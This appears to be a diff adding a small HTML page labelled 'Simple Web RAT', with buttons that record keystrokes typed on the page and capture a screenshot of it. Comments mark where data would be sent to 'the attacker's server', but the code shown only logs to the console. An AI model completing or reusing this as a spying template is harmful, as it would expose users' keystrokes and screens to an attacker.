@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simple Web RAT</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        .button { display: block; margin: 10px 0; padding: 10px; background-color: #007bff; color: white; text-align: center; text-decoration: none; border-radius: 5px; }
+        .button:hover { background-color: #0056b3; }
+        .screen { display: block; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <h1>Simple Web RAT</h1>
+    <a href="javascript:logKeys()" class="button">Log Keys</a>
+    <a href="javascript:takeScreenshot()" class="button">Take Screenshot</a>
+    <img src="" alt="Screen" id="screen" class="screen">
+    <textarea id="keys" rows="10" cols="50" placeholder="Keystrokes will appear here..."></textarea>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
+    <script>
+        function logKeys() {
+            const textarea = document.getElementById('keys');
+            textarea.value = '';
+            document.addEventListener('keydown', (event) => {
+                textarea.value += event.key;
+                // Send keystrokes to the attacker's server
+                // For demonstration purposes, we'll just log them to the console
+                console.log(`Key pressed: ${event.key}`);
+            });
+        }
+
+        function takeScreenshot() {
+            html2canvas(document.body).then((canvas) => {
+                const img = document.getElementById('screen');
+                img.src = canvas.toDataURL();
+                // Send screenshot to the attacker's server
+                // For demonstration purposes, we'll just log it to the console
+                console.log(`Screenshot taken: ${canvas.toDataURL()}`);
+            });
+        }
+    </script>
+</body>
+</html>
